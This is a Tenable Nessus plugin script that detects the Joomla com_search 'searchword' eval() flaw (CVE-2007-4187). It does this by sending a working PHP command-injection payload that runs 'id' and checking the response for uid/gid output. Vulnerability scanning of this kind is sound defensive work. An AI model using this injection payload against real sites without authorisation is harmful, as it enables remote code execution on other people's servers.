#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25992);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2007-4187");
  script_bugtraq_id(24997);
  script_xref(name:"OSVDB", value:"41260");

  script_name(english:"Joomla! CMS com_search Component default_results.php searchword Variable Remote Command Execution");
  script_summary(english:"Tries to run a command via Joomla");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The version of Joomla on the remote host fails to sanitize input to
the 'searchword' parameter before passing it to an 'eval()' function
in 'components/com_search/views/search/tmpl/default_results.php'.  An
unauthenticated attacker can leverage this issue to execute arbitrary
PHP code on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2007-07/0447.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla 1.5 RC1 or later as it is rumored to resolve the
issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to run a command.
  cmd = "id";
  r = http_send_recv3(method:"GET", port: port, 
    item:string(
      dir, "/index.php?",
      "searchword=", urlencode(str:'";system(id);#'), "&",
      "option=com_search&",
      "Itemid=1"   ));
  if (isnull(r)) exit(0);
  res = r[2];

  line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
  if (line)
  {
    if ("Search for <b>" >< line) 
      line = strstr(line, "Search for <b>") - "Search for <b>";

    report = string(
      "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
      "which produced the following output :\n",
      "\n",
      "  ", line
    );
    security_hole(port:port, extra:report);
    exit(0);
  }
}
